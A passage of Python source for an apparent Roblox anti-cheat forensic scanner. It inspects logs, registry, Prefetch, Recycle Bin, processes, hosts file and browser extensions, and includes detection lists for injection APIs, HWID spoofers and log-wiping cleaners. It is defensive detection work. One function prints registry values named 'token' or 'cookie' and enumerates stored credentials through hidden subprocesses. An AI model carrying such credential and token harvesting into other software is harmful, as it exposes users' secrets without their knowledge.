        if uname and uname.lower() in USERNAME_NOISE: return
        if uid not in account_map:
            account_map[uid] = {"username": uname or "Unknown","timestamps":[], "placeids":[], "sources":set()}
        else:
            if uname and uname != "Unknown" and account_map[uid]["username"] == "Unknown":
                account_map[uid]["username"] = uname
        account_map[uid]["sources"].add(source)
        if timestamp: account_map[uid]["timestamps"].append(timestamp)
        if placeid and placeid not in account_map[uid]["placeids"]:
            account_map[uid]["placeids"].append(placeid)

    log_dirs = [
        os.path.expanduser(r"~\AppData\Local\Roblox\logs"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\Logs"),
        os.path.expanduser(r"~\AppData\Local\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\LocalState\logs"),
        r"C:\Program Files (x86)\Roblox\logs",
        r"C:\Program Files\Roblox\logs",
    ]
    existing_log_dirs = [d for d in log_dirs if os.path.exists(d)]
    roblox_installed  = any(os.path.exists(p) for p in [
        os.path.expanduser(r"~\AppData\Local\Roblox"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap"),
        r"C:\Program Files (x86)\Roblox",
    ])

    for log_dir in existing_log_dirs:
        try:
            log_files = sorted(
                glob.glob(os.path.join(log_dir,"*.log")) +
                glob.glob(os.path.join(log_dir,"*.txt")),
                key=lambda f: os.path.getmtime(f), reverse=True)
        except Exception:
            log_files = []
        all_logs.extend(log_files)
        for fpath in log_files[:40]:
            try:
                with open(fpath,"r",encoding="utf-8",errors="ignore") as f:
                    raw = f.read(500000)
            except Exception:
                continue
            mtime_str = datetime.datetime.fromtimestamp(
                os.path.getmtime(fpath)).strftime("%Y-%m-%d %H:%M:%S")
            if PAT_CRASH.search(raw) and PAT_INJECT.search(raw):
                crash_inject_flag = True
                issues.append(("log", mtime_str, "CRASH + INJECTION — possible crash-on-inject"))
            for m in PAT_JOIN.finditer(raw):
                uid, uname = m.group(1), m.group(2)
                ts_list = PAT_TIME.findall(raw[:m.start()+200])
                ts = ts_list[-1] if ts_list else mtime_str
                place_m = PAT_PLACE.search(raw[max(0,m.start()-200):m.start()+200])
                pid = place_m.group(1) if place_m else None
                add_account(uid, uname, "log", ts, pid)
            for m in PAT_BSTRAP.finditer(raw):
                uid = m.group(1)
                name_m = PAT_BNAME.search(raw[max(0,m.start()-100):m.start()+200])
                uname = name_m.group(1) if name_m else None
                add_account(uid, uname, "bloxstrap_log", mtime_str)
            for m in PAT_GUI.finditer(raw):
                uname = m.group(1)
                if uname.lower() not in USERNAME_NOISE:
                    add_account(f"__u_{uname.lower()}", uname, "playergui", mtime_str)
            for m in PAT_FF_KEY.finditer(raw[:50000]):
                k, v = m.group(1), m.group(2).strip().strip(",").strip('"')
                if k not in fastflags_found:
                    fastflags_found[k] = v

    if not all_logs and roblox_installed:
        issues.append(("logs","N/A","Log directories empty — MANUAL LOG DELETION DETECTED"))
        manual_delete_flag = True
    elif len(all_logs) < 2 and roblox_installed:
        issues.append(("logs","N/A","Very few log files — possible partial deletion"))
        manual_delete_flag = True

    bloxstrap_state_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\State.json"),
        os.path.expandvars(r"%APPDATA%\Bloxstrap\State.json"),
    ]
    for sp in bloxstrap_state_paths:
        if not os.path.exists(sp): continue
        try:
            with open(sp,"r",encoding="utf-8",errors="ignore") as f:
                state = json.loads(f.read())
            for k,v in state.items() if isinstance(state,dict) else []:
                kl = k.lower()
                if "userid" in kl or "user_id" in kl:
                    add_account(str(v), None, "bloxstrap_state")
                elif "username" in kl or "displayname" in kl:
                    uid_key = k.replace("Name","Id").replace("name","id")
                    uid = state.get(uid_key,"")
                    if uid: add_account(str(uid), str(v), "bloxstrap_state")
        except Exception: pass

    ff_paths = [
        os.path.expanduser(r"~\AppData\Local\Roblox\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\Modifications\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\ClientSettings\ClientAppSettings.json"),
    ]
    for ffp in ff_paths:
        if not os.path.exists(ffp): continue
        try:
            with open(ffp,"r",encoding="utf-8",errors="ignore") as f:
                flags = json.loads(f.read())
            if isinstance(flags, dict):
                fastflags_found.update(flags)
        except Exception: pass

    result_accounts = []
    seen_keys = set()
    for uid, data in account_map.items():
        uname = data["username"] or "Unknown"
        clean_uid = None if uid.startswith("__") else uid
        key = (uname.lower(), clean_uid)
        if key in seen_keys: continue
        seen_keys.add(key)
        ts_list = sorted(set(str(t) for t in data["timestamps"] if t), reverse=True)
        result_accounts.append({
            "username":   uname,
            "userid":     clean_uid,
            "placeids":   sorted(set(data["placeids"])),
            "last_seen":  ts_list[0] if ts_list else "Unknown",
            "sources":    sorted(data["sources"]),
        })
    result_accounts.sort(key=lambda a: (
        0 if (a["userid"] and a["username"] != "Unknown") else
        1 if a["userid"] else 2))

    named = [a for a in result_accounts if a["username"] != "Unknown"]
    multi  = len(named) > 1

    lines = [
        f"\n  Log dirs found  : {len(existing_log_dirs)}",
        f"  Total log files : {len(all_logs)}",
        f"  Accounts found  : {len(result_accounts)}",
        f"  FastFlags seen  : {len(fastflags_found)}",
        "",
    ]
    if manual_delete_flag: lines.append("⚠ LOG DELETION DETECTED\n")
    if crash_inject_flag:  lines.append("⚠ CRASH-WHILE-INJECTING PATTERN\n")
    if multi:              lines.append(f"⚠ {len(named)} ACCOUNTS — possible ban evasion\n")
    if issues:
        lines.append("⚠ Issues:")
        for src,ts,reason in issues:
            lines.append(f"  {src} | {ts} | {reason}")
        lines.append("")
    lines.append("━"*50)
    for acc in result_accounts:
        lines.append(f"\n  Username : {acc['username']}")
        lines.append(f"  UserID   : {acc['userid'] or 'Unknown'}")
        lines.append(f"  Last Seen: {acc['last_seen']}")
        lines.append(f"  Places   : {', '.join(acc['placeids'][:10]) or 'N/A'}")
        lines.append(f"  Sources  : {', '.join(acc['sources'])}")
        lines.append("  " + "─"*35)
    if not result_accounts:
        lines.append("  No accounts found.")
    if fastflags_found:
        lines.append("\n━"*25)
        lines.append("\n  FastFlags (from logs/ClientSettings):")
        for k,v in list(fastflags_found.items())[:30]:
            lines.append(f"  {k} = {v}")

    flat = []
    for acc in result_accounts:
        u, i = acc["username"], acc["userid"] or ""
        if u != "Unknown" and i: flat.append(f"{u} (ID: {i})")
        elif u != "Unknown":     flat.append(u)
        elif i:                  flat.append(f"UserID: {i}")

    tamper = (len(issues) + (1 if multi else 0) +
              (2 if manual_delete_flag else 0) +
              (2 if crash_inject_flag  else 0))
    return section("Roblox Log Analysis", lines), tamper, flat


def scan_roblox_alts_registry():
    if not WINDOWS: return section("Roblox Alt Detection",["Windows only"]),0,[]
    import subprocess
    hits=[]; accounts=set()

    roblox_reg_paths=[
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\ROBLOX Corporation"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Roblox"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\ROBLOX Corporation"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Roblox"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\ROBLOX Corporation"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Classes\roblox"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Classes\roblox-player"),
    ]
    for hive,path in roblox_reg_paths:
        try:
            def walk_reg(h,p,depth=0):
                if depth>4: return
                try:
                    key=winreg.OpenKey(h,p,0,winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
                    vi=0
                    while True:
                        try:
                            name,val,_=winreg.EnumValue(key,vi)
                            nl=name.lower()
                            if any(x in nl for x in ["userid","username","accountname","token","cookie","user_id","account_id"]):
                                entry=f"[REG] {p}\\{name} = {str(val)[:80]}"
                                hits.append(entry)
                                if str(val).isdigit() and len(str(val))>=6:
                                    accounts.add(str(val))
                            vi+=1
                        except OSError: break
                    si=0
                    while True:
                        try:
                            sub=winreg.EnumKey(key,si)
                            walk_reg(h,p+"\\"+sub,depth+1)
                            si+=1
                        except OSError: break
                    winreg.CloseKey(key)
                except Exception: pass
            walk_reg(hive,path)
        except Exception: pass

    try:
        si_=subprocess.STARTUPINFO()
        si_.dwFlags=subprocess.STARTF_USESHOWWINDOW; si_.wShowWindow=0
        out=subprocess.run(["cmdkey","/list"],
                           capture_output=True,text=True,timeout=6,
                           creationflags=subprocess.CREATE_NO_WINDOW,startupinfo=si_)
        for line in out.stdout.splitlines():
            if "roblox" in line.lower() or "rbx" in line.lower():
                hits.append(f"[CRED] {line.strip()}")
    except Exception: pass

    bloxstrap_paths=[
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\State.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\Modifications\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%APPDATA%\Bloxstrap\State.json"),
    ]
    for bp in bloxstrap_paths:
        if not os.path.exists(bp): continue
        try:
            with open(bp,"r",encoding="utf-8",errors="ignore") as f:
                data=json.loads(f.read())
            if isinstance(data,dict):
                for k,v in data.items():
                    if any(x in k.lower() for x in ["userid","username","account","player"]):
                        hits.append(f"[BLOXSTRAP] {k} = {str(v)[:80]}")
                        if str(v).isdigit(): accounts.add(str(v))
        except Exception: pass

    import glob as _glob
    for db_path in _glob.glob(os.path.expandvars(r"%LOCALAPPDATA%\ConnectedDevicesPlatform\*\ActivitiesCache.db")):
        try:
            with open(db_path,"rb") as f: raw=f.read()
            text=raw.decode("utf-8",errors="ignore")+raw.decode("utf-16-le",errors="ignore")
            if "roblox" in text.lower():
                for m in re.finditer(r"roblox.{0,200}?(\d{7,15})",text,re.IGNORECASE):
                    uid=m.group(1)
                    if len(uid)>=7:
                        hits.append(f"[TIMELINE] Roblox UserID-like: {uid}")
                        accounts.add(uid)
                hits.append(f"[TIMELINE] Roblox activity found in ActivitiesCache")
        except Exception: pass

    try:
        mui_key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
                               0,winreg.KEY_READ)
        vi=0
        while True:
            try:
                name,val,_=winreg.EnumValue(mui_key,vi)
                if "roblox" in name.lower():
                    hits.append(f"[MUICACHE] {name}")
                vi+=1
            except OSError: break
        winreg.CloseKey(mui_key)
    except Exception: pass

    lines=[f"\n  Evidence entries: {len(hits)}",
           f"  Unique UserIDs found: {len(accounts)}",""]
    for h in hits[:30]: lines.append(f"  ► {h}")
    if accounts:
        lines.append("\n  UserIDs extracted:")
        for a in accounts: lines.append(f"  ► https://www.roblox.com/users/{a}/profile")
    if not hits: lines.append("  ✓ No Roblox registry traces found")
    return section("Roblox Alt Detection (Deep)",lines),len(accounts),list(accounts)


def scan_cheat_files():
    scan_dirs = [
        os.path.expanduser("~\\Downloads"), os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\AppData\\Local"), os.path.expanduser("~\\AppData\\Roaming"),
        "C:\\",
    ]
    SKIP = {"windows","system32","syswow64","programdata","program files","program files (x86)",
            "$recycle.bin","windowsapps","winsxs","servicing"}
    hits = []; hash_hits = []; scanned = 0

    for base in scan_dirs:
        if not os.path.exists(base): continue
        try:
            for root, dirs, files in os.walk(base):
                depth = root.replace(base,"").count(os.sep)
                if depth > 2: dirs.clear(); continue
                dirs[:] = [d for d in dirs if d.lower() not in SKIP]
                for fname in files:
                    scanned += 1
                    fpath = os.path.join(root, fname)
                    kws = matches_keyword(fpath)
                    if fname.lower().endswith((".exe",".dll")):
                        try:
                            sz = os.path.getsize(fpath)
                            if sz < 50_000_000:
                                fhash = sha1_file(fpath)
                                if fhash in KNOWN_CHEAT_HASHES:
                                    hash_hits.append({"path":fpath,"sha1":fhash,
                                                      "reason":"KNOWN CHEAT HASH — renamed file detected"})
                        except Exception: pass
                    if not kws and fname.lower().endswith((".exe",".dll")):
                        try:
                            with open(fpath,"rb") as f: hdr = f.read(512)
                            if hdr.startswith(b"MZ"):
                                suspicious = []
                                if b"WriteProcessMemory" in hdr: suspicious.append("WPM import")
                                if b"CreateRemoteThread" in hdr: suspicious.append("CRT import")
                                if b"VirtualAllocEx" in hdr: suspicious.append("VAEx import")
                                if b"NtWriteVirtualMemory" in hdr: suspicious.append("NTWVM import")
                                if suspicious and not any(fp in fpath.lower() for fp in FALSE_POSITIVE_PATHS):
                                    kws = suspicious
                        except Exception: pass
                    if kws:
                        try:
                            stat = os.stat(fpath)
                            ctime = datetime.datetime.fromtimestamp(stat.st_ctime)
                            hits.append({"path":fpath,"name":fname,
                                         "sha1":"N/A","size":stat.st_size,
                                         "ext":os.path.splitext(fname)[1].lower(),
                                         "created":ctime,"keywords":kws})
                        except Exception: pass
                    if scanned > 15000: dirs.clear(); break
        except Exception: pass

    lines = [f"\nScanned: {scanned}  Keyword Hits: {len(hits)}  Hash Hits: {len(hash_hits)}", "="*50]
    if hash_hits:
        lines.append("\n⚠ HASH-BASED DETECTIONS (renamed cheat files):")
        for h in hash_hits:
            lines.append(f"  ✗ {h['path']}")
            lines.append(f"    SHA1: {h['sha1']} — {h['reason']}")
    for i,h in enumerate(hits,1):
        lines.append(f"\n[{i}] {', '.join(h['keywords'])}")
        lines.append(f"    {h['path']}")
        lines.append(f"    SHA1: {h['sha1']}  Size: {h['size']}b  Ext: {h['ext']}")
        lines.append(f"    Created: {h['created'].strftime('%Y-%m-%d %H:%M:%S')}")
    if not hits and not hash_hits: lines.append("✓ No cheat files found.")
    return section("Cheat File Scan", lines), len(hits)+len(hash_hits), hits+hash_hits


def scan_yara():
    scan_dirs=[os.path.expanduser("~\\Downloads"),os.path.expanduser("~\\Desktop")]
    hits=[]; scanned=0
    for base in scan_dirs:
        if not os.path.exists(base): continue
        try:
            for fname in os.listdir(base):
                if not fname.lower().endswith((".exe",".dll")): continue
                fpath=os.path.join(base,fname)
                try:
                    sz=os.path.getsize(fpath)
                    if sz<100: continue
                    kws=matches_keyword(fpath)
                    with open(fpath,"rb") as f: hdr=f.read(512)
                    reasons=list(kws)
                    if hdr.startswith(b"MZ"):
                        if b"WriteProcessMemory" in hdr: reasons.append("WPM import")
                        if b"CreateRemoteThread" in hdr: reasons.append("CRT import")
                        if b"VirtualAllocEx" in hdr: reasons.append("VAEx import")
                    if reasons: hits.append({"path":fpath,"size":sz,"sha1":"N/A","reason":" | ".join(reasons)})
                    scanned+=1
                    if scanned>200: break
                except Exception: pass
        except Exception: pass
    lines=[f"Scanned top-level: {scanned}  Hits: {len(hits)}","="*50]
    for i,h in enumerate(hits,1): lines.append(f"\n[{i}] {h['reason']}\n    {h['path']}")
    if not hits: lines.append("✓ No suspicious executables.")
    return section("YARA / Heuristic",lines),len(hits),hits


def scan_unsigned():
    import subprocess, tempfile
    scan_dirs = [os.path.expanduser("~\\Downloads"), os.path.expanduser("~\\Desktop"),
                 os.path.expanduser("~\\AppData\\Local\\Temp")]
    TRUSTED = ["microsoft","google","nvidia","amd","intel","logitech","razer","corsair",
               "steam","valve","epic games","discord","twitch","obs","adobe","spotify","zoom"]
    hits=[]; scanned=0; candidates=[]
    for base in scan_dirs:
        if not os.path.exists(base): continue
        try:
            for root,dirs,files in os.walk(base):
                if root.replace(base,"").count(os.sep)>3: dirs.clear(); continue
                dirs[:] = [d for d in dirs if not any(t in d.lower() for t in TRUSTED)]
                for fname in files:
                    if not fname.lower().endswith((".exe",".dll")): continue
                    fpath = os.path.join(root,fname)
                    try:
                        sz = os.path.getsize(fpath)
                        if sz >= 1024: candidates.append((fpath,sz)); scanned+=1
                    except Exception: pass
                if scanned >= 80: dirs.clear(); break
        except Exception: pass
    if not WINDOWS or not candidates:
        for fpath,size in candidates:
            try:
                with open(fpath,"rb") as f: hdr = f.read(256)
                if hdr.startswith(b"MZ") and matches_keyword(fpath):
                    hits.append({"path":fpath,"size":size,"sha1":sha1_file(fpath),"reason":"keyword","publisher":"N/A"})
            except Exception: pass
    else:
        try:
            with tempfile.NamedTemporaryFile(mode="w",suffix=".txt",delete=False,encoding="utf-8") as tf:
                tf_path = tf.name
                for fpath,_ in candidates: tf.write(fpath.replace("'","''")+"\n")
            ps = f"""
$results=@()
Get-Content '{tf_path}' | ForEach-Object {{
    $p=$_.Trim(); if($p -eq ''){{return}}
    try {{
        $s=Get-AuthenticodeSignature -LiteralPath $p -ErrorAction SilentlyContinue
        $status=if($s){{$s.Status}}else{{'Unknown'}}
        $subject=if($s -and $s.SignerCertificate){{$s.SignerCertificate.Subject}}else{{''}}
        $results+="$status`t$subject`t$p"
    }} catch {{ $results+="Unknown`t`t$p" }}
}}
$results
"""
            si = subprocess.STARTUPINFO()
            si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0
            out = subprocess.run(["powershell","-NoProfile","-NonInteractive","-WindowStyle","Hidden","-Command",ps],
                                 capture_output=True,text=True,timeout=25,
                                 creationflags=subprocess.CREATE_NO_WINDOW,startupinfo=si)
            size_map = {fp:sz for fp,sz in candidates}
            for line in out.stdout.splitlines():
                parts = line.strip().split("\t",2)
                if len(parts) < 3: continue
                status,subject,fpath = parts
                if status.strip()=="Valid": continue
                if any(t in subject.strip().lower() for t in TRUSTED): continue
                sz = size_map.get(fpath.strip(),0)
                hits.append({"path":fpath.strip(),"size":sz,
                             "sha1":sha1_file(fpath.strip()) if sz<20_000_000 else "N/A",
                             "reason":f"Unsigned ({status.strip()})","publisher":subject.strip() or "None"})
        except Exception: pass
        finally:
            try: os.unlink(tf_path)
            except Exception: pass
    lines = [f"\nScanned: {scanned}  Unsigned: {len(hits)}","="*50]
    for i,h in enumerate(hits,1):
        lines.append(f"\n[{i}] {h['reason']}\n    {h['path']}\n    Publisher: {h.get('publisher','N/A')}\n    {h['size']}b | {h['sha1']}")
    if not hits: lines.append("✓ No suspicious unsigned executables.")
    return section("Unsigned Scan",lines),len(hits),hits


def scan_recycle_bin():
    rb = "C:\\$Recycle.Bin"; hits=[]; total=0
    last_mod = "Unknown"; mod_ts = None
    try:
        import subprocess as _sp
        _si = subprocess.STARTUPINFO()
        _si.dwFlags = subprocess.STARTF_USESHOWWINDOW; _si.wShowWindow = 0
        _out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command",
             "(Get-Item 'C:\\$Recycle.Bin' -Force).LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')"],
            capture_output=True, text=True, timeout=6,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=_si)
        if _out.stdout.strip():
            last_mod = _out.stdout.strip()
            try: mod_ts = datetime.datetime.strptime(last_mod, "%Y-%m-%d %H:%M:%S")
            except Exception: mod_ts = None
        else:
            stat = os.stat(rb)
            mod_ts = datetime.datetime.fromtimestamp(stat.st_mtime)
            last_mod = mod_ts.strftime("%Y-%m-%d %H:%M:%S")
        for root,dirs,files in os.walk(rb):
            for f in files:
                total += 1
                kws = matches_keyword(f)
                if kws:
                    try:
                        fp = os.path.join(root,f)
                        mt = datetime.datetime.fromtimestamp(os.stat(fp).st_mtime)
                        hits.append((f,mt,kws))
                    except Exception: hits.append((f,None,kws))
    except Exception as e:
        return section("Recycle Bin",[f"Could not read: {e}"]),0,"Unknown"

    recent_mod = False
    if mod_ts:
        delta = datetime.datetime.now() - mod_ts
        if delta.total_seconds() < 3600:
            recent_mod = True

    orphaned = []
    try:
        for root,dirs,files in os.walk(rb):
            i_files = {f[2:] for f in files if f.startswith("$I")}
            r_files = {f[2:] for f in files if f.startswith("$R")}
            for orphan in i_files - r_files:
                orphaned.append(os.path.join(root,"$I"+orphan))
    except Exception: pass

    lines = [f"\nLast Modified: {last_mod}  Total Items: {total}"]
    if recent_mod:
        lines.append("⚠ Recycle Bin modified within the last hour — possible evidence wiping")
    if orphaned:
        lines.append(f"\n⚠ {len(orphaned)} orphaned $I file(s) — file data was removed separately:")
        for o in orphaned[:5]: lines.append(f"  {o}")
    for fname,mt,kws in hits:
        mt_str = mt.strftime("%Y-%m-%d %H:%M:%S") if mt else "N/A"
        lines.append(f"  {fname} | {mt_str} | [{', '.join(kws)}]")
    if not hits: lines.append("✓ No cheat files in Recycle Bin.")
    integrity_hits = (1 if recent_mod else 0) + len(orphaned)
    return section("Recycle Bin", lines), len(hits)+integrity_hits, last_mod


def scan_sysmain():
    if not WINDOWS:
        return section("SysMain / Prefetch Service",["Windows only"]),0,False
    sysmain_disabled=False; start_value=None; state_str="Unknown"; lines=[]
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SysMain",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        start_value,_ = winreg.QueryValueEx(key,"Start"); winreg.CloseKey(key)
        state_map = {2:"Automatic (Normal)",3:"Manual",4:"DISABLED"}
        state_str = state_map.get(start_value,f"Unknown ({start_value})")
        sysmain_disabled = (start_value==4)
    except Exception as e:
        lines.append(f"  Could not read SysMain registry: {e}")
    pf_dir="C:\\Windows\\Prefetch"; pf_count=0
    try: pf_count=len(glob.glob(os.path.join(pf_dir,"*.pf")))
    except Exception: pass
    pf_empty=pf_count<5; hit_count=0
    lines.append(f"  SysMain Service State : {state_str}")
    lines.append(f"  Registry Start Value  : {start_value}")
    lines.append(f"  Prefetch File Count   : {pf_count}")
    lines.append("")
    if sysmain_disabled:
        hit_count+=3
        lines.append("  ⚠ SysMain is DISABLED — Prefetch logging suppressed")
        if pf_empty:
            hit_count+=5
            lines.append("  ✗ AUTO FAIL: SysMain disabled AND Prefetch folder nearly empty")
        else:
            lines.append(f"  NOTE: {pf_count} prefetch files still present")
    else:
        lines.append(f"  ✓ SysMain is running normally ({state_str})")
        if pf_count<10:
            hit_count+=1
            lines.append(f"  ⚠ Low prefetch count ({pf_count}) despite SysMain enabled — possible manual wipe")
        else:
            lines.append(f"  ✓ Prefetch file count normal ({pf_count} files)")
    return section("SysMain / Prefetch Service Check",lines),hit_count,sysmain_disabled


def scan_running_processes():
    if not WINDOWS:
        return section("Running Processes",["Windows only"]),0,[]
    hits=[]; roblox_pids=[]
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command",
             "Get-Process | Select-Object Name,Id,Path | ConvertTo-Csv -NoTypeInformation"],
            capture_output=True,text=True,timeout=8,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        for line in out.stdout.splitlines()[1:]:
            parts = line.strip('"').split('","')
            if len(parts)>=2:
                pname,pid = parts[0],parts[1]
                ppath = parts[2] if len(parts)>2 else ""
                if "roblox" in pname.lower(): roblox_pids.append(pid)
                kws = matches_keyword(pname+" "+ppath)
                if kws: hits.append({"name":pname,"pid":pid,"path":ppath,"keywords":kws,"type":"process"})
    except Exception: pass

    lines = []
    if hits:
        lines.append(f"⚠ {len(hits)} suspicious process(es) found:")
        for h in hits:
            lines.append(f"  ✗ {h['name']} (PID:{h['pid']}) [{', '.join(h['keywords'])}]")
            if h['path']: lines.append(f"     {h['path']}")
    else:
        lines.append("  ✓ No suspicious processes running")
    if roblox_pids:
        lines.append(f"\n  Roblox PIDs: {', '.join(roblox_pids)}")
    return section("Running Process / Injection Check",lines),len(hits),(hits,[])


def scan_cleaners():
    if not WINDOWS:
        return section("Cleaner / Bypass Detection", ["Windows only"]), 0, "None"
    import subprocess
    found = []; hit_count = 0
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0

    CLEANER_NAMES = [
        "ccleaner","privazer","bleachbit","eraser","moo0","wisecleaner",
        "auslogics","iobit","glary","fileshredder","diskwipe","dban",
        "clean-sweep","cleansweep","robloxcleaner","roblox-clean",
        "bygonespoofer","bygone","stringcleaner","string-cleaner",
        "fnclean","fn-clean","sscleaner","ss-cleaner",
        "hwid-spoofer","hwid_spoofer","hwidspoofer","spoofer",
        "banbypass","ban-bypass","prefetchcleaner","logcleaner","log-cleaner","logwiper",
        "tracecleaner","trace-cleaner","evtxcleaner","eventcleaner",
        "bamcleaner","bam-cleaner","shellbagcleaner","regcleaner",
        "discordcleaner","discord-cleaner",
        "bypass","cleaner","wiper","antiforensic","anti-forensic",
    ]
    pf_dir = r"C:\Windows\Prefetch"
    if os.path.exists(pf_dir):
        try:
            for pf in glob.glob(os.path.join(pf_dir, "*.pf")):
                name_lower = os.path.basename(pf).lower()
                for sig in CLEANER_NAMES:
                    if sig in name_lower:
                        mt = datetime.datetime.fromtimestamp(
                            os.path.getmtime(pf)).strftime("%Y-%m-%d %H:%M:%S")
                        found.append(f"Prefetch: {os.path.basename(pf)} (last run: {mt})")
                        hit_count += 2
                        break
        except Exception: pass

    CLEANER_REG = [
        (r"SOFTWARE\Piriform\CCleaner","CCleaner"),
        (r"SOFTWARE\PrivaZer","PrivaZer"),
        (r"SOFTWARE\BleachBit","BleachBit"),
        (r"SOFTWARE\IObit\IObit Uninstaller","IObit"),
        (r"SOFTWARE\Auslogics\BoostSpeed","Auslogics BoostSpeed"),
        (r"SOFTWARE\Eraser","Eraser"),
        (r"SOFTWARE\Wise\Wise Care 365","Wise Care 365"),
    ]
    for reg_path, label in CLEANER_REG:
        for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            try:
                winreg.OpenKey(hive, reg_path, 0, winreg.KEY_READ)
                found.append(f"Registry: {label} installed")
                hit_count += 2
                break
            except Exception: pass

    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts_path, "r", encoding="utf-8", errors="ignore") as f:
            hosts = f.read()
        roblox_blocks = [l.strip() for l in hosts.splitlines()
                         if "roblox" in l.lower() and not l.strip().startswith("#")
                         and not l.strip().startswith("127.0.0.1 localhost")]
        if roblox_blocks:
            for rb in roblox_blocks[:5]:
                found.append(f"HOSTS FILE: Roblox entry: {rb}")
                hit_count += 3
    except Exception: pass

    SCAN_DIRS = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Documents"),
    ]
    BAT_SIGS = ["clean","wipe","bypass","spoof","purge","erase","sweep","fnclean","traceclean","logclean","bamclean"]
    for sdir in SCAN_DIRS:
        if not os.path.exists(sdir): continue
        try:
            for fname in os.listdir(sdir):
                fl = fname.lower()
                if not (fl.endswith(".bat") or fl.endswith(".ps1") or fl.endswith(".cmd")): continue
                for sig in BAT_SIGS:
                    if sig in fl:
                        fpath = os.path.join(sdir, fname)
                        mt = datetime.datetime.fromtimestamp(
                            os.path.getmtime(fpath)).strftime("%Y-%m-%d %H:%M:%S")
                        found.append(f"Script: {fpath}  (modified: {mt})")
                        hit_count += 3
                        break
        except Exception: pass

    lines = []
    if found:
        lines.append(f"\n  ⚠ {len(found)} cleaner/bypass indicator(s) found:\n")
        for f in found:
            lines.append(f"  ✗ {f}")
    else:
        lines.append("  ✓ No cleaning/bypass tools detected")

    summary = ", ".join(found[:3]) if found else "None detected"
    return section("Cleaner / Bypass Detection", lines), hit_count, summary


def scan_browser_extensions():
    """
    Checks installed browser extensions for known Roblox-exploit
    companion extensions — some executors ship a browser-side helper
    extension used to bypass web-based checks or auto-inject on page
    load. This only reads extension manifest names/IDs from each
    browser's profile folder; it never touches cookies, tokens, or
    any credential data, so it carries none of the risk profile that
    Discord-token matching did.
    """
    if not WINDOWS:
        return section("Browser Extensions", ["Windows only"]), 0, []

    EXT_KEYWORDS = [
        "exploit", "executor", "roblox bypass", "script injector",
        "roblox unlock", "anticheat bypass", "bypass detector",
    ]

    profile_dirs = [
        (os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"), "Chrome"),
        (os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"), "Edge"),
        (os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"), "Brave"),
    ]

    hits = []
    for base, browser_label in profile_dirs:
        if not os.path.exists(base):
            continue
        try:
            for profile in os.listdir(base):
                ext_dir = os.path.join(base, profile, "Extensions")
                if not os.path.isdir(ext_dir):
                    continue
                for ext_id in os.listdir(ext_dir):
                    ext_path = os.path.join(ext_dir, ext_id)
                    if not os.path.isdir(ext_path):
                        continue
                    try:
                        versions = os.listdir(ext_path)
                        if not versions:
                            continue
                        manifest_path = os.path.join(ext_path, versions[0], "manifest.json")
                        if not os.path.exists(manifest_path):
                            continue
                        with open(manifest_path, "r", encoding="utf-8", errors="ignore") as f:
                            manifest_raw = f.read(4096)
                        manifest_lower = manifest_raw.lower()
                        matched = [kw for kw in EXT_KEYWORDS if kw in manifest_lower]
                        if matched:
                            name_match = re.search(r'"name"\s*:\s*"([^"]{1,60})"', manifest_raw)
                            ext_name = name_match.group(1) if name_match else ext_id
                            hits.append({
                                "browser": browser_label, "id": ext_id,
                                "name": ext_name, "keywords": matched,
                            })
                    except Exception:
                        pass
        except Exception:
            pass

    lines = [f"\n  Extension folders scanned across Chrome/Edge/Brave"]
    if hits:
        lines.append(f"  ⚠ {len(hits)} suspicious extension(s) found:\n")
        for h in hits:
            lines.append(f"  ✗ [{h['browser']}] {h['name']}  (ID: {h['id']})")
            lines.append(f"    Matched: {', '.join(h['keywords'])}")
    else:
        lines.append("  ✓ No suspicious browser extensions detected")

    return section("Browser Extension Check", lines), len(hits), hits


def scan_network_vpn():
    if not WINDOWS:
        return section("Network / VPN",["Windows only"]),0,"Unknown"
    lines=[]; vpn_detected=False; vpn_info_str=""
    vpn_adapter_keywords=["vpn","mullvad","nordvpn","expressvpn","surfshark","proton",
                          "windscribe","pia","privateinternetaccess","cyberghost",
                          "tap-","tun0","tun1","openvpn","wireguard"]
    try:
